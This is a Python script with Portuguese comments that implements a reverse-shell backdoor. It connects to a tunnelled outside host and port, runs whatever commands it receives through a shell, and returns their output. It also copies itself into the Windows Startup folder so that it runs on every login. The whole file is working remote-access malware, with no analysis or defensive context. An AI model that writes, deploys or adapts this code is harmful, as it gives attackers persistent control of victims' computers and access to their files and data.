import socket
from time import sleep
import subprocess
import os
import shutil

# ip padrãp
IP = "video-online.gl.at.ply.gg"
PORT = 16621

def connect(ip, porta):
    try:
         c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         c.connect((ip, porta))
         return c
    except Exception as e:
        print(f"Erro de conexão {e}")


def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:  
                cmd(c, data)
    except Exception as e:
       print(f"listen error {e}")


def cmd(c, data):
    try:  
        # Se o comando for "CD" ele vai ir para o diretorio que começa apartir
        # Do terceiro caractere
        if data.startswith("cd "):
            os.chdir(data[3:].strip())
            return

        # Cria o subprocess
        p = subprocess.Popen(
                data,
                shell=True,
                stdin=subprocess.PIPE , # entrada
                stderr=subprocess.PIPE , # mensagem de erro
                stdout=subprocess.PIPE # saida
        )
        c.send(
            p.stdout.read() + p.stderr.read() + b"\n"
        )
    except Exception as e:
        print(f"CMD FUNCTION ERROR {e}")


if __name__ == "__main__":
    startup = os.path.join(
        os.environ["APPDATA"],
        "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    )

    for arquivo in os.listdir(startup):
        if arquivo == "teste.py":
            continue

    shutil.copy("teste.py", startup)
    
    try:
       while True:
            client = connect(IP, PORT)
            if client:
                listen(client)
            else:   
                sleep(.5)

    except KeyboardInterrupt:
       print("Program stopped")

    except Exception as e:
       print("Main connection error {e}")